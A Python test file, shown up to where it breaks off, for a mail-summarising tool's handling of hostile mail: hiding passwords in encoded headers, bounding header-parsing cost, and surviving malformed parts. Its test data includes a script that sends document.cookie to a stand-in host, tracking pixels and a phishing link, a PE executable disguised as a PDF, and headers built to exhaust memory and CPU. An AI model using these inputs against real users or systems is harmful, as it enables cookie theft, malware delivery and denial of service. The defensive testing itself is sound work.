"""A mail from a hostile sender.

A host application reads every mail in the operator's home, in a worker with 1 GiB
of memory and a 20 s budget per file. A mail's headers, parts and names are
the sender's to choose, so sift must never show a secret a header carries
past a line break, never hand Python's header parser a value whose parse
grows with its square, never run a mail past the budget, and never let one
element it cannot read -- a header, the body, a part -- blank the rest.
"""
import base64
import email.headerregistry
import email.message
import hashlib
import json
import random
import shutil
import tempfile
import time
import tracemalloc
import unittest
from pathlib import Path
from unittest import mock

from sift import deadline
from sift.config import Config
from sift.detect import detect
from sift.extract import email_msg, extract
from sift.extract.base import (_redaction_pass, find_secrets, redact_value,
                               remember_hidden, scrub)
from sift.llm.base import LLMResult
from sift.report import render_json, render_markdown, render_text
from sift.summarize import summarize_path

from _timing import cpu_ratio, flat_bound

BIG = 25_000_000
V = "Kx9vQ2mZ7pL4"
HIDDEN = f"<{len(V)} chars — not shown>"
#: The review's encoded-words: a password after an encoded line break.
EW = "=?utf-8?q?password:=0AKx9vQ2mZ7pL4?="
EW_SENT = "=?utf-8?q?Your_new_password_is=0AKx9vQ2mZ7pL4?="
HEAD = ("From: Alice <alice@example.org>\r\nTo: Bob <bob@example.org>\r\n"
        "Date: Tue, 29 Sep 2026 10:00:00 +0200\r\n")
PLAIN = "MIME-Version: 1.0\r\nContent-Type: text/plain\r\n\r\nPlease see below.\r\n"
#: A minimal PE: the DOS header's e_lfanew points at "PE\0\0".
PE = (b"MZ" + b"\x90\x00" * 29 + (0x40).to_bytes(4, "little") + b"PE\x00\x00"
      + b"\x4c\x01" + b"\x00" * 300)


def _b64(data, width=76):
    enc = base64.b64encode(data)
    return b"\r\n".join(enc[i:i + width] for i in range(0, len(enc), width))


class _Mails(unittest.TestCase):
    def setUp(self):
        self.dir = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.dir, ignore_errors=True)

    def write(self, name, data):
        path = self.dir / name
        path.write_bytes(data if isinstance(data, bytes) else data.encode())
        return path

    def ex(self, data, name="m.eml"):
        """What extract() gives, through the boundary."""
        path = self.write(name, data)
        return extract(path, detect(path), BIG)

    def raw(self, data, name="m.eml"):
        """What the mail extractor gives, without the boundary: nothing
        may escape it."""
        path = self.write(name, data)
        return email_msg.extract(path, detect(path), BIG)

    def summ(self, data, name="m.eml", client=None, **config):
        path = self.write(name, data)
        config = Config(no_llm=client is None, quiet=True, cache=False,
                        **config)
        return summarize_path(path, config, client, None)

    def outputs(self, summ):
        return {"text": render_text(summ, color=False),
                "json": render_json([summ]),
                "markdown": render_markdown([summ]),
                "stored": json.dumps(summ.to_dict(), ensure_ascii=False)}

    def assertHidden(self, summ, value=V):
        leaked = {name: text for name, text in self.outputs(summ).items()
                  if value in text}
        self.assertEqual({}, leaked)


class _Echo:
    """A model that repeats the Subject and the bare value back."""

    name = provider = model = "stub"
    endpoint = "memory://stub"

    def __init__(self, said):
        self.said = said

    def available(self):
        return True

    def list_models(self):
        return ["stub"]

    def generate(self, system, user, *, images=None, temperature=0.2,
                 max_tokens=800):
        return LLMResult(
            text=(f"TYPE: Email\nSUMMARY: The subject reads: {self.said}\n"
                  f"KEY POINTS:\n- Subject: {self.said}\n- {V}\n"
                  f"ENTITIES: {V}\nNOTES: none"),
            model="stub", provider="stub")


# ---- HIGH-1: a secret after an encoded line break ----------------------

#: The Subject forms of a review's secrets_subject.py: (name, the header
#: as written). ew_newline and ew_newline_colon published the password; the
#: other nineteen held and must go on holding.
SUBJECT_FORMS = [
    ("plain", "Your new password is Kx9vQ2mZ7pL4"),
    ("plain_colon", "password: Kx9vQ2mZ7pL4"),
    ("plain_de", "Ihr Kennwort lautet Kx9vQ2mZ7pL4"),
    ("ew_b", "=?utf-8?b?" + base64.b64encode(
        b"Your new password is Kx9vQ2mZ7pL4").decode() + "?="),
    ("ew_q", "=?utf-8?q?Your_new_password_is_Kx9vQ2mZ7pL4?="),
    ("ew_q_colon", "=?utf-8?q?password:_Kx9vQ2mZ7pL4?="),
    ("ew_b_latin1_de", "=?iso-8859-1?b?" + base64.b64encode(
        "Ihr Kennwort für München lautet Kx9vQ2mZ7pL4".encode("latin-1"))
     .decode() + "?="),
    ("folded", "Your new password\r\n is Kx9vQ2mZ7pL4"),
    ("folded_tab", "Your new password is\r\n\tKx9vQ2mZ7pL4"),
    ("folded_ew", "=?utf-8?q?Your_new_password?=\r\n "
                  "=?utf-8?q?_is_Kx9vQ2mZ7pL4?="),
    ("split_ew", "=?utf-8?q?Your_new_password_is_Kx9v?= =?utf-8?q?Q2mZ7pL4?="),
    ("split_ew_folded", "=?utf-8?q?Your_new_password_is_Kx9v?=\r\n "
                        "=?utf-8?q?Q2mZ7pL4?="),
    ("split_ew_b_q", "=?utf-8?b?" + base64.b64encode(
        b"Your new password is Kx9v").decode() + "?= =?utf-8?q?Q2mZ7pL4?="),
    ("split_ew_three", "=?utf-8?q?password:_Kx?= =?utf-8?q?9vQ2m?= "
                       "=?utf-8?q?Z7pL4?="),
    ("ew_glued", "password: Kx9v=?utf-8?q?Q2mZ7pL4?="),
    ("ew_newline", "=?utf-8?q?Your_new_password_is=0AKx9vQ2mZ7pL4?="),
    ("ew_newline_colon", "=?utf-8?q?password:=0AKx9vQ2mZ7pL4?="),
    ("ew_tab", "=?utf-8?q?password:=09Kx9vQ2mZ7pL4?="),
    ("ew_bidi", "=?utf-8?q?password:_=E2=80=AEKx9vQ2mZ7pL4?="),
    ("ew_zwsp", "=?utf-8?q?password:_Kx9v=E2=80=8BQ2mZ7pL4?="),
    ("ew_unknown_charset", "=?x-unknown?q?password:_Kx9vQ2mZ7pL4?="),
]


class EncodedLineBreakTest(_Mails):
    """A header value holds one line by definition; a line break in one came
    from an encoded-word, and sift folds it into " ⏎ " before anything is
    said. The secret rules read a line break between a keyword and its value
    and did not read the fold: "password: ⏎ Kx9vQ2mZ7pL4" was published in
    the summary, where the same Subject on one line was hidden."""

    def test_a_password_after_an_encoded_line_break_is_hidden(self):
        summ = self.summ(HEAD + f"Subject: {EW}\r\n" + PLAIN)
        self.assertHidden(summ)
        self.assertIn(f"password: ⏎ {HIDDEN}", summ.summary)

    def test_every_route_a_header_takes(self):
        routes = {
            "sentence": HEAD + f"Subject: {EW_SENT}\r\n" + PLAIN,
            "comments": HEAD + f"Subject: hi\r\nComments: {EW}\r\n" + PLAIN,
            "named": HEAD + f"Subject: hi\r\nPassword-Hint: {EW}\r\n" + PLAIN,
            "from": f"From: {EW} <alice@example.org>\r\nTo: b@example.org\r\n"
                    "Subject: hi\r\n" + PLAIN,
            "cc": HEAD + f"Cc: {EW} <c@example.org>\r\nSubject: hi\r\n" + PLAIN,
            "forwarded": HEAD + "Subject: fwd\r\nMIME-Version: 1.0\r\n"
                "Content-Type: multipart/mixed; boundary=B\r\n\r\n--B\r\n"
                "Content-Type: text/plain\r\n\r\nforwarding\r\n--B\r\n"
                "Content-Type: message/rfc822\r\n\r\nFrom: carol@example.org"
                f"\r\nSubject: {EW}\r\n\r\ninner body\r\n--B--\r\n",
            "forwarded_from": HEAD + "Subject: fwd\r\nMIME-Version: 1.0\r\n"
                "Content-Type: multipart/mixed; boundary=B\r\n\r\n--B\r\n"
                "Content-Type: text/plain\r\n\r\nforwarding\r\n--B\r\n"
                f"Content-Type: message/rfc822\r\n\r\nFrom: {EW} <c@x.org>"
                "\r\nSubject: inner\r\n\r\ninner body\r\n--B--\r\n",
            "attachment_name": HEAD + "Subject: hi\r\nMIME-Version: 1.0\r\n"
                "Content-Type: multipart/mixed; boundary=B\r\n\r\n--B\r\n"
                "Content-Type: text/plain\r\n\r\nsee attached\r\n--B\r\n"
                "Content-Type: application/octet-stream\r\n"
                "Content-Disposition: attachment; filename*=utf-8''"
                "password%3A%0AKx9vQ2mZ7pL4\r\n\r\nxx\r\n--B--\r\n",
        }
        for route, mail in routes.items():
            with self.subTest(route=route):
                self.assertHidden(self.summ(mail))

    def test_a_warning_that_names_the_attachment(self):
        """extract() hid the name in the metadata and quoted it whole in
        the masquerade warning, which its boundary did not read."""
        for name in (b"filename*=utf-8''password%3A%0AKx9vQ2mZ7pL4.pdf",
                     b'filename="password: Kx9vQ2mZ7pL4.pdf"'):
            with self.subTest(name=name):
                ex = self.ex(_mail(
                    b"Content-Type: multipart/mixed; boundary=B",
                    b"--B\r\nContent-Type: text/plain\r\n\r\nsee\r\n--B\r\n"
                    b"Content-Type: application/pdf\r\nContent-Disposition: "
                    b"attachment; " + name + b"\r\nContent-Transfer-Encoding:"
                    b" base64\r\n\r\n" + _b64(PE) + b"\r\n--B--\r\n"))
                self.assertEqual(1, len(ex.warnings))
                self.assertNotIn(V, ex.warnings[0])
                self.assertEqual("masquerade",
                                 ex.finding_kinds.get(ex.warnings[0]))

    def test_a_mailbox_subject(self):
        mbox = ("From a@example.org Tue Sep 29 10:00:00 2026\nFrom: "
                f"a@example.org\nSubject: {EW}\n\nhi\n\n"
                "From b@example.org Tue Sep 29 10:00:00 2026\nFrom: "
                "b@example.org\nSubject: second\n\nhi\n")
        self.assertHidden(self.summ(mbox, name="box.mbox"))

    def test_a_model_that_repeats_the_value_bare(self):
        summ = self.summ(HEAD + f"Subject: {EW}\r\n" + PLAIN,
                         client=_Echo("password:\nKx9vQ2mZ7pL4"))
        self.assertTrue(summ.llm_used)
        self.assertHidden(summ)

    def test_the_rendered_mail_is_masked_where_it_is_shown(self):
        """A host application's viewer masks sift's rendering of a mail by
        find_secrets' spans: the fold hid the value from them too."""
        ex = self.ex(HEAD + f"Subject: {EW}\r\n" + PLAIN)
        at = ex.text.index(V)
        self.assertTrue(any(s.start <= at and at + len(V) <= s.end
                            for s in find_secrets(ex.text) if
                            s.reason != "bidi"), ex.text)

    def test_every_subject_form_is_hidden(self):
        for form, subject in SUBJECT_FORMS:
            with self.subTest(form=form):
                summ = self.summ(HEAD + f"Subject: {subject}\r\n" + PLAIN)
                self.assertHidden(summ)
                for half in (V[:6], V[6:]):
                    self.assertNotIn(half, self.outputs(summ)["json"])

    def test_an_ordinary_subject_across_a_line_break_is_kept(self):
        summ = self.summ(HEAD + "Subject: =?utf-8?q?Meeting=0Aagenda_for_"
                                "Monday?=\r\n" + PLAIN)
        self.assertIn("“Meeting ⏎ agenda for Monday”", summ.summary)
        summ = self.summ(HEAD + "Subject: =?utf-8?q?password:=0Asee_the_"
                                "vault?=\r\n" + PLAIN)
        self.assertIn("password: ⏎ see the vault", summ.summary)

    def test_the_rules_read_the_fold_as_the_line_break_it_stands_for(self):
        for folded, raw in (("password: ⏎ Kx9vQ2mZ7pL4",
                             "password:\nKx9vQ2mZ7pL4"),
                            ("Your new password is ⏎ Kx9vQ2mZ7pL4",
                             "Your new password is\nKx9vQ2mZ7pL4"),
                            ("Das Kennwort ⏎ lautet Kx9vQ2mZ7pL4",
                             "Das Kennwort\nlautet Kx9vQ2mZ7pL4")):
            with self.subTest(folded=folded), remember_hidden() as seen:
                self.assertNotIn(V, redact_value(raw))
                self.assertNotIn(V, redact_value(folded))
                self.assertNotIn(V, scrub({"subject": folded})["subject"])
                self.assertIn(V, seen)
                self.assertEqual(redact_value(folded),
                                 _redaction_pass(folded).text)
                # The value is masked, and nothing before the fold is: a
                # "key: value" line reads "⏎ Kx9v..." as its value.
                spans = find_secrets(folded)
                at = folded.index(V)
                self.assertTrue(any(s.start <= at and s.end == len(folded)
                                    for s in spans), spans)
                self.assertTrue(all(s.start >= folded.index("⏎")
                                    for s in spans), spans)

    def test_the_fold_alone_hides_nothing(self):
        for text in ("Meeting ⏎ agenda for Monday",
                     "password ⏎ policy requires 12 characters",
                     "The password ⏎ is correct",
                     "Kennwort ⏎ vergessen? Hier klicken",
                     "⏎ ⏎ ⏎"):
            with self.subTest(text=text):
                self.assertEqual(text, redact_value(text))
                self.assertEqual([], find_secrets(text))


# ---- HIGH-2, HIGH-3: a header's cost -------------------------------------

def _subject_mail(value: bytes, name=b"Subject") -> bytes:
    return (b"From: a@example.org\r\nTo: b@example.org\r\n" + name + b": "
            + value + b"\r\nContent-Type: text/plain\r\n\r\nx\r\n")


def _filled(unit: bytes, size: int) -> bytes:
    return (unit * (size // len(unit) + 1))[:size].rstrip(b", ")


class _Lengths:
    """Records the length of every value Python's header parser is handed."""

    def __init__(self):
        self.seen = []
        original = email.headerregistry.HeaderRegistry.__call__
        recorder = self

        def call(registry, name, value):
            recorder.seen.append((name.lower(), len(value)))
            return original(registry, name, value)
        self.patch = mock.patch.object(email.headerregistry.HeaderRegistry,
                                       "__call__", call)

    def __enter__(self):
        self.patch.start()
        return self

    def __exit__(self, *exc):
        self.patch.stop()


class HeaderCostTest(_Mails):
    """Python's header parser keeps, for every encoded-word, the rest of the
    header (_header_value_parser.get_encoded_word: ew.cte = value), and
    reads a run of words, addresses or comments in time that grows with the
    square of the header: a Subject of 256 KiB of encoded-words was killed
    at 1 GiB, one of 1 MiB of words took 83 s, past a 20 s budget nothing
    looked at. Each value is cut to email_msg._MAX_HEADER_CHARS before the
    parser sees it, each header is parsed once, and the clock is read
    between two."""

    def test_the_bound_is_what_an_address_list_can_hold(self):
        # RFC 5321 4.5.3.1.8: a server takes at least 100 recipients;
        # 4.5.3.1.3: a path is at most 256 octets.
        self.assertEqual(100 * 256, email_msg._MAX_HEADER_CHARS)

    def test_no_value_the_parser_is_handed_is_longer_than_the_bound(self):
        # Sizes 0.1.71 survives: 64 KiB of encoded-words held 133 MiB there,
        # 128 KiB of words took a second or two.
        cases = {
            "ew": _subject_mail(_filled(b"=?utf-8?q?w=C3=BC?= ", 64 << 10)),
            "words": _subject_mail(_filled(b"a ", 128 << 10)),
            "addresses": _subject_mail(_filled(b"x@example.org, ", 128 << 10),
                                       b"Cc"),
            "comments": _subject_mail(_filled(
                b'"q\\"x" (c (d) e) <y@example.org>, ', 128 << 10), b"Cc"),
            "other": _subject_mail(_filled(b"a ", 128 << 10), b"Attendees"),
            "rfc2231": (b"From: a@b.org\r\nSubject: s\r\nMIME-Version: 1.0\r\n"
                        b"Content-Type: multipart/mixed; boundary=B\r\n\r\n"
                        b"--B\r\nContent-Type: text/plain\r\n\r\nbody\r\n"
                        b"--B\r\nContent-Type: application/octet-stream\r\n"
                        b"Content-Disposition: attachment; " + b"; ".join(
                            b"filename*%d*=%%41" % i for i in range(8_000))
                        + b"\r\n\r\nxx\r\n--B--\r\n"),
            "parameters": (b"From: a@b.org\r\nSubject: s\r\nContent-Type: "
                           b"text/plain; " + b"; ".join(
                               b"p%d=v%d" % (i, i) for i in range(4_000))
                           + b"\r\n\r\nbody\r\n"),
        }
        for case, data in cases.items():
            with self.subTest(case=case), _Lengths() as lengths:
                ex = self.ex(data)
                self.assertLessEqual(max(n for _, n in lengths.seen),
                                     email_msg._MAX_HEADER_CHARS)
                self.assertTrue(any("cut" in n and "characters" in n
                                    for n in ex.notes), ex.notes)

    def test_encoded_words_cost_no_memory_that_grows_with_their_square(self):
        data = _subject_mail(_filled(b"=?a?q?b?= ", 96 << 10))
        tracemalloc.start()
        try:
            self.raw(data)
            _, peak = tracemalloc.get_traced_memory()
        finally:
            tracemalloc.stop()
        # One header at the bound, measured: 25,600 characters of the
        # shortest encoded-words hold about 30 MiB while they are parsed.
        self.assertLess(peak, 48 << 20)

    def test_each_header_is_parsed_once(self):
        data = (HEAD + "Subject: s\r\nCc: c@example.org\r\nKeywords: k\r\n"
                "Received: from x by y; Tue, 29 Sep 2026 10:00:00 +0200\r\n"
                "MIME-Version: 1.0\r\nContent-Type: multipart/mixed; "
                "boundary=B\r\n\r\n--B\r\nContent-Type: text/plain\r\n\r\n"
                "body\r\n--B\r\nContent-Type: application/pdf; name=a.pdf\r\n"
                "Content-Disposition: attachment; filename=a.pdf\r\n\r\n"
                "%PDF-1.4\r\n--B--\r\n").encode()
        with _Lengths() as lengths:
            ex = self.raw(data)
        self.assertEqual(1, ex.metadata["attachment_count"])
        counts = {}
        for name, _ in lengths.seen:
            counts[name] = counts.get(name, 0) + 1
        # Three Content-Types and the attachment's Content-Disposition,
        # each read once; the routing noise is not parsed at all.
        self.assertEqual({"from": 1, "to": 1, "date": 1, "subject": 1,
                          "cc": 1, "keywords": 1, "content-type": 3,
                          "content-disposition": 1}, counts)

    def test_the_clock_stops_a_mail_of_many_long_headers(self):
        value = _filled(b"a ", 25_000)
        data = (b"From: a@example.org\r\nSubject: s\r\n" + b"".join(
            b"Attendees-%d: %s\r\n" % (i, value) for i in range(150))
            + b"Content-Type: text/plain\r\n\r\nx\r\n")
        path = self.write("many.eml", data)
        started = time.monotonic()
        with self.assertRaises(deadline.DeadlineExceeded), \
                deadline.limit(0.3):
            email_msg.extract(path, detect(path), BIG)
        self.assertLess(time.monotonic() - started, 3.0)

    def test_the_clock_stops_the_parse_of_a_large_mail(self):
        parts = b"".join(b"--B\r\nContent-Type: text/plain\r\n\r\npart %d\r\n"
                         % i for i in range(30_000))
        data = (b"From: a@b.org\r\nSubject: s\r\nContent-Type: multipart/mixed;"
                b" boundary=B\r\n\r\n" + parts + b"--B--\r\n")
        path = self.write("parts.eml", data)
        started = time.monotonic()
        with self.assertRaises(deadline.DeadlineExceeded), \
                deadline.limit(0.3):
            email_msg.extract(path, detect(path), BIG)
        self.assertLess(time.monotonic() - started, 3.0)

    def test_a_header_at_the_bound_is_read_whole_and_one_past_it_is_cut(self):
        bound = email_msg._MAX_HEADER_CHARS
        for size, cut in ((bound, False), (bound + 1, True)):
            with self.subTest(size=size):
                ex = self.ex(_subject_mail((b"a " * size)[:size - 1] + b"z"))
                subject = ex.metadata["headers"]["subject"]
                self.assertEqual(cut, not subject.endswith("z"))
                self.assertEqual(cut, any("Subject" in n and "cut" in n
                                          for n in ex.notes), ex.notes)

    def test_a_hundred_recipients_are_read_whole(self):
        to = ", ".join(f"Recipient Number{i} <recipient.number{i}@example.org>"
                       for i in range(100))
        ex = self.ex(("From: a@example.org\r\nTo: " + to + "\r\nSubject: s\r\n"
                      "Content-Type: text/plain\r\n\r\nx\r\n").encode())
        self.assertEqual(100, ex.metadata["headers"]["to"].count("@"))
        self.assertEqual([], [n for n in ex.notes if "cut" in n])

    def test_summarize_path_keeps_the_budget(self):
        """A Cc of 256 KiB costs what one of 32 KiB does -- both are cut at
        _MAX_HEADER_CHARS -- within flat_bound(8) of it, the two summarized
        in turn: read past the cut, the value would cost eight times as
        much, and parsed in the square of its length sixty-four times. And
        it is summarized, not given up on.

        The budget is a bound on a reading that never ends, not the measure:
        the summary took 0.41 s of CPU when a fixed loop took its least,
        and the same loop took 6.4 times that at the slowest moment measured
        on this host (0.114 to 0.734 s) -- 2.6 s, past a budget of 2, within
        one of 5. 2.5 s of wall clock and a budget of 2 read 1.0 under a
        host load of 30 to 42 (0.1.73)."""
        summaries = []

        def summarizing(size):
            path = self.write(f"cc{size}.eml", _subject_mail(
                _filled(b"x@example.org, ", size), b"Cc"))
            config = Config(no_llm=True, quiet=True, cache=False,
                            time_budget=5.0)
            return lambda: summaries.append(
                summarize_path(path, config, None, None))
        ratio = cpu_ratio(summarizing(256 << 10), summarizing(32 << 10))
        self.assertLess(ratio, flat_bound(8), f"{ratio:.2f}x the CPU for 8x "
                                              f"the header")
        self.assertEqual({"email"}, {summ.kind for summ in summaries})


# ---- MEDIUM-1: one element does not blank the mail ------------------------

HDR = (b"From: Alice <alice@example.org>\r\nTo: Bob <bob@example.org>\r\n"
       b"Date: Tue, 29 Sep 2026 10:00:00 +0200\r\n"
       b"Message-ID: <r15@example.org>\r\n")


def _mail(ctype_line, body, extra=b"", subject=b"r15"):
    return (HDR + b"Subject: " + subject + b"\r\nMIME-Version: 1.0\r\n"
            + ctype_line + b"\r\n" + extra + b"\r\n" + body)


def _nested_rfc822(depth):
    msg = b"From: leaf@example.org\r\nSubject: leaf\r\n\r\nleaf body\r\n"
    for i in range(depth):
        msg = (b"From: level%d@example.org\r\nSubject: level %d\r\n"
               b"MIME-Version: 1.0\r\nContent-Type: message/rfc822\r\n\r\n"
               % (i, i)) + msg
    return HDR + msg[msg.index(b"Subject:"):]


def _nested_rfc822_in_mixed(depth):
    msg = b"From: leaf@example.org\r\nSubject: leaf\r\n\r\nleaf body\r\n"
    for i in range(depth):
        b = b"b%d" % i
        msg = (b"From: level%d@example.org\r\nSubject: level %d\r\n"
               b"MIME-Version: 1.0\r\nContent-Type: multipart/mixed; "
               b"boundary=" % (i, i) + b + b"\r\n\r\n--" + b +
               b"\r\nContent-Type: text/plain\r\n\r\nforwarding %d\r\n--" % i
               + b + b"\r\nContent-Type: message/rfc822\r\n\r\n" + msg
               + b"\r\n--" + b + b"--\r\n")
    return HDR + msg[msg.index(b"Subject:"):]


_OUTER = (b"From: a@example.org\r\nTo: b@example.org\r\nSubject: outer\r\n"
          b"MIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=B"
          b"\r\n\r\n--B\r\nContent-Type: text/plain\r\n\r\nbody\r\n--B\r\n"
          b"Content-Type: application/pdf; name=invoice.pdf\r\n"
          b"Content-Disposition: attachment; filename=invoice.pdf\r\n"
          b"Content-Transfer-Encoding: base64\r\n\r\n" + _b64(PE) + b"\r\n"
          b"--B\r\nContent-Type: message/rfc822\r\n\r\n")


def _attached(inner: bytes) -> bytes:
    return _OUTER + inner + b"\r\n--B--\r\n"


class OneElementTest(_Mails):
    """462 of 91,849 fuzzed mails raised out of the mail extractor, and the
    boundary then reported the whole mail as an extractor error: no headers,
    no body, no attachment list, no masquerade warning. Each header, the
    body and each part is read on its own now, and what cannot be read is a
    note."""

    def assertWhole(self, ex, attachments=None):
        self.assertNotIn("extractor_error", ex.metadata)
        self.assertTrue(ex.text.startswith("# Email\n"), ex.text[:200])
        if attachments is not None:
            self.assertEqual(attachments, ex.metadata["attachment_count"])

    def assertMasquerade(self, ex):
        self.assertTrue(any("invoice.pdf" in w and "not what its name" in w
                            for w in ex.warnings), ex.warnings)

    def test_an_attached_message_whose_address_python_cannot_write(self):
        for name, inner in (
                ("from", b"From: =?utf-8?q?a=0Ab?= " + b"x" * 90
                 + b" <x@example.org>\r\n\r\ninner\r\n"),
                ("to_list", b"To: " + b", ".join(
                    [b"=?utf-8?q?n=0Am?= <x@example.org>"] * 5)
                 + b"\r\n\r\ninner\r\n"),
                ("group", b"To: grp: " + b"=?utf-8?q?=0A?= <a@b>, " * 10
                 + b";\r\n\r\ninner\r\n"),
                ("params", b"Content-Type: text/plain; name*=utf-8''"
                 + b"%0A" * 40 + b"\r\n\r\ninner\r\n")):
            with self.subTest(name=name):
                ex = self.raw(_attached(inner))
                self.assertWhole(ex, attachments=2)
                self.assertMasquerade(ex)

    def test_no_part_is_flattened_to_measure_it(self):
        def refuse(*args, **kwargs):
            raise AssertionError("a part was flattened")
        with mock.patch.object(email.message.Message, "as_bytes", refuse), \
                mock.patch.object(email.message.Message, "as_string", refuse):
            ex = self.raw(_attached(b"From: c@example.org\r\nSubject: inner"
                                    b"\r\n\r\ninner body\r\n"))
        self.assertWhole(ex, attachments=2)
        entry = ex.metadata["attachments"][1]
        self.assertEqual(("inner.eml", "message/rfc822"),
                         (entry["filename"], entry["content_type"]))
        self.assertGreater(entry["size"], 0)

    def test_an_attached_message_is_measured_as_python_writes_it(self):
        """The count that replaced as_bytes() gives what as_bytes() gave,
        for the forwards ordinary mail is made of."""
        from email import message_from_bytes, policy
        inners = [
            b"From: c@example.org\r\nSubject: inner\r\n\r\ninner body\r\n",
            b"From: C <c@example.org>\nTo: d@example.org\nSubject: s\n"
            b"MIME-Version: 1.0\nContent-Type: multipart/mixed; boundary=X\n"
            b"\nthe preamble\n--X\nContent-Type: text/plain\n\nline one\n"
            b"line two\n--X\nContent-Type: application/pdf; name=a.pdf\n"
            b"Content-Transfer-Encoding: base64\n\nJVBERi0xLjQK\n--X--\n"
            b"the epilogue\n",
            _nested_rfc822_in_mixed(3),
        ]
        for inner in inners:
            with self.subTest(inner=inner[:40]):
                data = _attached(inner)
                ex = self.raw(data)
                part = message_from_bytes(data, policy=policy.default)\
                    .get_payload()[2]
                self.assertEqual(len(part.as_bytes()),
                                 ex.metadata["attachments"][1]["size"])

    def test_a_thousand_nested_comments_in_the_sender(self):
        data = (b"From: " + b"(" * 1000 + b"x" + b")" * 1000
                + b" a@example.org\r\nTo: b@example.org\r\nSubject: comments"
                b"\r\nContent-Type: text/plain\r\n\r\nthe body\r\n")
        ex = self.raw(data)
        self.assertWhole(ex)
        self.assertEqual("comments", ex.metadata["headers"]["subject"])
        self.assertIn("the body", ex.text)
        self.assertTrue(any("From" in n for n in ex.notes), ex.notes)

    def test_a_charset_holding_a_nul(self):
        for charset in (b'charset="utf\x008"', b"charset*=utf-8''utf%008"):
            with self.subTest(charset=charset):
                data = _mail(b"Content-Type: text/plain; " + charset,
                             "Grüße aus Köln\r\n".encode())
                ex = self.raw(data)
                self.assertWhole(ex)
                self.assertIn("Grüße aus Köln", ex.text)

    def test_a_disposition_python_cannot_parse_keeps_the_rest(self):
        # The fuzzer's IndexError out of get_body (_header_value_parser).
        data = _mail(b"Content-Type: multipart/mixed; boundary=B",
                     b"--B\r\nContent-Type: text/plain\r\n"
                     b"Content-Disposition: inline; filename*\r\n\r\n"
                     b"the text\r\n--B\r\nContent-Type: application/pdf; "
                     b"name=invoice.pdf\r\nContent-Disposition: attachment; "
                     b"filename=invoice.pdf\r\nContent-Transfer-Encoding: "
                     b"base64\r\n\r\n" + _b64(PE) + b"\r\n--B--\r\n")
        ex = self.raw(data)
        self.assertWhole(ex)
        self.assertEqual("r15", ex.metadata["headers"]["subject"])
        self.assertMasquerade(ex)

    def test_forwards_nested_past_the_bound_are_cut_before_recursion(self):
        for depth in (130, 250):
            with self.subTest(depth=depth):
                ex = self.raw(_nested_rfc822_in_mixed(depth))
                self.assertWhole(ex)
                names = [a["filename"] for a in ex.metadata["attachments"]]
                self.assertIn("(nesting too deep to read)", names)
                self.assertEqual(f"level {depth - 2}.eml", names[0])

    def test_a_mail_nested_deeper_than_the_parser_keeps_its_headers(self):
        ex = self.raw(_nested_rfc822(1000))
        self.assertWhole(ex)
        self.assertEqual("level 999", ex.metadata["headers"]["subject"])
        self.assertTrue(any("nests deeper" in n for n in ex.notes), ex.notes)

    def test_an_ordinary_mail_has_no_note(self):
        ex = self.raw(_attached(b"From: c@example.org\r\nSubject: inner\r\n"
                                b"\r\ninner body\r\n"))
        self.assertWhole(ex, attachments=2)
        self.assertMasquerade(ex)
        self.assertEqual([], [n for n in ex.notes if "active content" not in n])


# The reviewer's fuzzer (seed 1): its
# eight seed mails, its mutation, and the cases of its 91,849 that raised
# out of email_msg.extract at 0.1.71, by their number in the sequence.

def _fz_mail(ctype_line, body, extra=b"", subject=b"r15"):
    return _mail(ctype_line, body, extra, subject)


_FZ_PNG = b"\x89PNG\r\n\x1a\n" + b"\x00\x00\x00\rIHDR" + b"\x00" * 64
_FZ_HTML = (b"<html><head><style>body{background:url('https://track.example/"
            b"bg.png')}@import url(https://track.example/i.css);</style>"
            b"<script>new Image().src='https://evil.example/s?'+document."
            b"cookie</script></head><body><p>Hello, your order 4711 shipped."
            b"</p><img src=\"https://images.example/logo.png\" alt=\"Company "
            b"logo\"><img src=\"cid:logo123@example\" alt=\"inline logo\">"
            b"<img src=\"https://track.example/open?u=bob&m=r15\" width=\"1\" "
            b"height=\"1\" alt=\"\"><a href=\"https://phish.example/login\">"
            b"Track your parcel</a><div style=\"background-image:url(https://"
            b"track.example/div.png)\">styled</div><noscript><img src=\"https:"
            b"//track.example/ns.gif\"></noscript><iframe src=\"https://evil."
            b"example/frame\"></iframe></body></html>")


def _fz_seeds():
    one_att = _fz_mail(
        b"Content-Type: multipart/mixed; boundary=B",
        b"--B\r\nContent-Type: text/plain\r\n\r\nPlease find the invoice "
        b"attached.\r\n--B\r\nContent-Type: application/pdf; name=invoice.pdf"
        b"\r\nContent-Disposition: attachment; filename=invoice.pdf\r\n"
        b"Content-Transfer-Encoding: base64\r\n\r\n" + _b64(PE)
        + b"\r\n--B--\r\n")
    single_rfc822 = _fz_mail(
        b"Content-Type: message/rfc822",
        b"From: Carol <carol@example.org>\r\nTo: Alice <alice@example.org>\r\n"
        b"Subject: inner original\r\n\r\n" + b"The original body line.\r\n")
    alternative = _fz_mail(
        b"Content-Type: multipart/alternative; boundary=A",
        b"--A\r\nContent-Type: text/plain\r\n\r\nHello, your order 4711 "
        b"shipped.\r\n--A\r\nContent-Type: text/html; charset=utf-8\r\n\r\n"
        + _FZ_HTML + b"\r\n--A--\r\n")
    related = _fz_mail(
        b"Content-Type: multipart/related; boundary=R",
        b"--R\r\nContent-Type: text/html; charset=utf-8\r\n\r\n" + _FZ_HTML
        + b"\r\n--R\r\nContent-Type: image/png\r\nContent-ID: <logo123@"
        b"example>\r\nContent-Transfer-Encoding: base64\r\n\r\n"
        + _b64(_FZ_PNG) + b"\r\n--R--\r\n")
    continuations = _fz_mail(
        b"Content-Type: multipart/mixed; boundary=B",
        b"--B\r\nContent-Type: text/plain\r\n\r\nsee attached\r\n--B\r\n"
        b"Content-Type: application/octet-stream\r\nContent-Disposition: "
        b"attachment; filename*0*=utf-8''a%E9; filename*1=b; filename*3*=%ZZ;"
        b" filename*1*=dup\r\nContent-Transfer-Encoding: base64\r\n\r\n"
        + _b64(b"payload bytes") + b"\r\n--B--\r\n")
    qp = _fz_mail(b"Content-Type: text/plain; charset=utf-8",
                  b"Hello w=C3=B6rld=\r\n" + b"end=",
                  b"Content-Transfer-Encoding: quoted-printable\r\n")
    mixed_in_alternative = _fz_mail(
        b"Content-Type: multipart/alternative; boundary=A",
        b"--A\r\nContent-Type: text/plain\r\n\r\ninvoice\r\n--A\r\n"
        b"Content-Type: multipart/mixed; boundary=M\r\n\r\n--M\r\n"
        b"Content-Type: text/html\r\n\r\n<p>invoice</p>\r\n--M\r\n"
